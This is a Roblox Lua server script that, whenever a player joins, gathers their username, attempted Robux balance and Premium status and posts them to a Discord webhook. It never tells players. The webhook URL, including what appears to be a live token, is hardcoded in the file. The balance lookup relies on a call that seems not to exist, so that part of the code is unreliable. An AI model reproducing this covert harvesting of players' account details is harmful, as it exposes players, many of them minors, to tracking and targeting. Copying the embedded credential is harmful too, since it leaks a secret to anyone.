local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local PremiumService = game:GetService("PremiumFeaturesService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1346416926246830125/pg2nsLOVvJYOvjLmDwvYvti9zknqfwz7KO5qTsPA1Q-vwt1YziX6IUH4FhPkOwIu78ht"

local function getRobuxBalance(player)
    local success, result = pcall(function()
        return player:GetAccountBalance()
    end)
    return success and result or "Unknown"
end

local function hasPremium(player)
    local success, result = pcall(function()
        return player.MembershipType == Enum.MembershipType.Premium
    end)
    return success and (result and "✅ Yes" or "❌ No") or "Unknown"
end

local function sendWebhook(player)
    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    local gameIcon = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=512&height=512&format=png"
    local timestamp = os.date("%Y-%m-%d %H:%M:%S", os.time())

    local robux = getRobuxBalance(player)
    local premium = hasPremium(player)

    local data = {
        ["embeds"] = {{
            ["title"] = gameName,
            ["color"] = 3447003, -- Blue
            ["thumbnail"] = { ["url"] = gameIcon },
            ["fields"] = {
                { ["name"] = "Player", ["value"] = player.Name, ["inline"] = true },
                { ["name"] = "Robux Balance", ["value"] = robux, ["inline"] = true },
                { ["name"] = "Premium", ["value"] = premium, ["inline"] = true },
                { ["name"] = "Place", ["value"] = gameName, ["inline"] = true },
                { ["name"] = "Time", ["value"] = timestamp, ["inline"] = false }
            }
        }}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }

    local success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)

    if not success then
        warn("Webhook failed: " .. err)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    -- Simulate script execution logging when a player joins (modify this event if needed)
    sendWebhook(player)
end)
